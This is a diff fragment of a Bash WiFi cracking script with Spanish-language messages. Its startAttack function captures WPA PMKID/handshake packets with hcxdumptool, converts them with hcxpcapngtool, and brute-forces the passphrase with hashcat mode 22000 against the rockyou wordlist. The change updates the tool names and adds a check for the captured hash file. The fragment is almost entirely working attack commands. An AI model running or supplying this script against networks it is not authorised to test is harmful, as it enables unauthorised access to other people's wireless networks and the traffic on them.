@@ -101,10 +101,17 @@ function startAttack(){
 		timeout 60 bash -c "hcxdumptool -i ${networkCard} --enable_status=1 -o Captura"
 		echo -e "\n${yellow}[+]${end} ${gray} Obteniendo Hashes... ${end}\n"
 		sleep 2
-		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+		hcxpcapngtool -o myHashes Captura
 
-		echo -e "\n${gray} Iniciando proceso de FUerza Bruta con HashCat...${end}\n"
-		hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+		test -f myHashes
+		if  [ "$(echo $?)" == "0" ]; then
+			echo -e "\n${gray} Iniciando proceso de Fuerza Bruta con HashCat...${end}\n"
+			sleep 2
+
+			hashcat -m 22000 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+		else
+			echo -e "\n${red}[!]${end} ${gray} No se a podido capturar el paquete necesario...${end}\n"
+		fi
 	else
 		echo -e "\n${red}[*] Este mode de ataque no es valido ${end}\n"
 	fi
